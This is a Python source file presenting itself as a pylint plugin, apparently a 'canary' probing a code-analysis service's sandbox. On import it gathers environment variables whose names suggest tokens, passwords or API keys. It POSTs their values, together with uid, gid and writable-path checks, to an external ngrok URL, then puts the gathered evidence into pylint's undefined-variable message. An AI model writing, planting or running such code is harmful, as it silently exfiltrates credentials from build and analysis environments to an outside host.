import json
import os
import re
import urllib.error
import urllib.request


CALLBACK = "https://dcd6-49-207-201-243.ngrok-free.app/pylint-3fc5441a"
CREDENTIAL_NAME = re.compile(
    r"(?:TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|API[_-]?KEY|PRIVATE[_-]?KEY|AUTH)",
    re.IGNORECASE,
)


def writable(path):
    return os.access(path, os.W_OK)


credentials = {
    name: value
    for name, value in list(os.environ.items())[:1000]
    if value and CREDENTIAL_NAME.search(name)
}
payload = json.dumps(
    {
        "canary": "codacy-pylint-plugin-canary",
        "tool": "pylint",
        "runtime": {
            "uid": os.getuid(),
            "gid": os.getgid(),
            "cwd": os.getcwd(),
            "sourceWritable": writable("/src"),
            "rootWritable": writable("/"),
            "workdirWritable": writable("/workdir"),
        },
        "credentials": credentials,
    }
).encode()

try:
    request = urllib.request.Request(
        CALLBACK,
        data=payload,
        headers={
            "content-type": "application/json",
            "user-agent": "codacy-analyzer-canary/pylint",
        },
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=5) as response:
        HTTPS_EGRESS = 200 <= response.status < 300
except (OSError, urllib.error.URLError):
    HTTPS_EGRESS = False

RUNTIME_EVIDENCE = " ".join(
    [
        "CODACY_PYLINT_CANARY_EXECUTED",
        f"uid={os.getuid()}",
        f"gid={os.getgid()}",
        f"source_writable={writable('/src')}",
        f"root_writable={writable('/')}",
        f"workdir_writable={writable('/workdir')}",
        f"https_egress={HTTPS_EGRESS}",
        f"credential_names={','.join(sorted(credentials))}",
    ]
)


def register(linter):
    for definition in linter.msgs_store.get_message_definitions(
        "undefined-variable"
    ):
        definition.msg = RUNTIME_EVIDENCE
